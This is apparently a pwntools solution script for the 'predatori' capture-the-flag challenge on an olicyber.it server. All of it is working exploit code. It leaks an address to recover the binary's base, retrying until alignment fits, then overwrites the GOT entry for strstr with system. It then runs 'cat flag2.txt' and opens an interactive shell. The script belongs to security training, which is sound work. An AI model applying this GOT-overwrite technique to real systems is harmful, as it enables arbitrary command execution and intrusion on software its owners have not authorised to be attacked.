from pwn import *

elf = context.binary = ELF('./predatori')
context.terminal = ()
while True:
    if args.REMOTE:
        p = remote('predatori.challs.olicyber.it', 15006)
    elif args.GDB:
        p = gdb.debug(elf.path, gdbscript='''
            b www
            c
        ''')
    else:
        p = elf.process()
    
    p.recvuntil(b'Esci\n')
    p.sendline(b'1')
    p.sendafter(b':',b'`')  # 80 = rww
    p.recvline()
    p.recvline()

    address = u64(p.recv(8).strip().ljust(8,b'\x00'))

    base = address - elf.sym['__libc_csu_init']
    if base & 0xffff == 0:
        
        break
    else:
        p.close()



p.recvuntil(b'Esci\n')
p.sendline(b'2')
elf.address = base
address_to_write = elf.got['strstr']
print("Address to write:", hex(address_to_write))
p.sendafter(b':', p64(address_to_write))  # 80 = rww
p.sendafter(b':', b'8')  
p.sendafter(b'?', p64(elf.sym['system']))

p.recvuntil(b'Esci\n')
p.sendline(b'zaza')
p.recvline()
p.sendline(b'cat flag2.txt')
p.interactive()





